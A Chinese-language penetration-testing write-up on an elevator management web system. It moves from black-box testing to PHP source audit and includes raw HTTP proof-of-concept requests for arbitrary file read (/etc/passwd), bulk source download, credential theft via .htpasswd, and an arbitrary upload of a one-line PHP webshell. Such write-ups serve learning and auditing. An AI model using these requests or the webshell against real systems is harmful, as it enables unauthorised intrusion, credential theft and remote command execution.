### 电梯Web系统黑盒到PHP白盒挖掘RCE的过程

#### 概述
本文记录了一次针对某电梯Web系统的漏洞挖掘过程，包括发现任意文件上传和命令注入漏洞。这是对PHP代码审计学习的一个总结。

#### 前置知识
在进行PHP代码审计时，了解以下执行命令的函数是必要的：

1. **`shell_exec()`**
   - **语法**: `string shell_exec(string $cmd)`
   - **功能**: 执行命令，并将结果作为字符串返回。
   - **返回值**: 如果执行失败，则返回`NULL`；执行成功则返回执行结果字符串。
   - **注意**: 在安全模式下此函数被禁用。

2. **`passthru()`**
   - **语法**: `void passthru(string $command, int &$return_var = ?)`
   - **功能**: 直接将执行结果输出给浏览器，没有返回值。
   - **状态码**: 返回0表示成功，返回1表示失败。

3. **`exec()`**
   - **语法**: `string exec(string $command, array &$output, int &$return_var = ?)`
   - **功能**: 执行命令，可以将所有输出保存到数组中，返回最后一行结果。
   - **状态码**: 返回0表示成功，返回1表示失败。
   - **技巧**: 使用管道命令`2>&1`可以捕获错误输出并分析。

4. **`system()`**
   - **语法**: `string system(string $command, int &$return_var = ?)`
   - **功能**: 输出并返回最后一行结果。
   - **状态码**: 返回0表示成功，返回1表示失败。

#### 函数区别
- **`shell_exec()`**: 只返回结果，不输出。
- **`passthru()`**: 只输出结果，不返回，有状态码。
- **`exec()`**: 返回最后一行结果，所有结果可以保存到一个数组中，有状态码。
- **`system()`**: 输出并返回最后一行结果，有状态码。

#### 漏洞分析
1. **任意文件读取漏洞**
   - **发现**: 通过抓包篡改路径，成功读取系统用户文件（如`/etc/passwd`）。
   - **POC**:
     ```http
     POST /app_show_log_lines.php HTTP/1.1
     Host: xxx.xxx.xxx.xxx
     Content-Type: application/x-www-form-urlencoded
     Connection: close
     Content-Length: 25

     fileselection=/etc/passwd
     ```

2. **任意文件打包下载漏洞**
   - **发现**: 功能允许将任意文件打包成ZIP文件下载。
   - **POC**:
     ```http
     POST /app_download_zipped_logs.php HTTP/1.1
     Host: X.X.X.X
     Content-Type: application/x-www-form-urlencoded
     Connection: close
     Content-Length: 34

     fileselection[]=/var/www/html/*
     ```

3. **源码审计**
   - **获取源码**: 成功下载源码后，开始进行白盒审计。
   - **重点检查**: 配置文件上传、服务管理、时间服务器管理等功能。

4. **认证绕过**
   - **发现**: `authorization.php`文件中调用`/etc/apache2/.htpasswd`验证账号密码。
   - **利用**: 通过任意文件读取获取密码，成功登录。

5. **命令注入**
   - **NTP服务相关文件**: `change_ntp.php`, `monitor_ntp.php`, `change_time.php`。
   - **正则过滤**: 发现正则表达式过滤，无法直接注入。
   - **Ping功能**: `change_networking.php`文件中使用`validate_ip`和`escapeshellarg`函数，常规注入无效。

6. **任意文件上传**
   - **发现**: `upload_bin_install.php`文件中存在任意文件上传漏洞。
   - **POC**:
     ```http
     POST /upload_bin_install.php HTTP/1.1
     Host: X.X.X.X
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAgAiQWYWgJxBjqwA
     Cookie: PHPSESSID=ieu43tab3c7bvnop3v3ome75i6
     Connection: close
     Content-Length: 203

     ------WebKitFormBoundaryAgAiQWYWgJxBjqwA
     Content-Disposition: form-data; name="uploadedfile"; filename="1.php"
     Content-Type: text/plain

     <?php echo shell_exec($_GET['cmd']); ?>

     ------WebKitFormBoundaryAgAiQWYWgJxBjqwA--
     ```
   - **利用**: 上传恶意PHP文件，成功获取WebShell。

#### 结论
通过黑盒测试发现了任意文件读取和打包下载漏洞，进一步通过白盒审计发现了任意文件上传漏洞，最终成功获取了WebShell。这是一次完整的从黑盒到白盒的漏洞挖掘过程。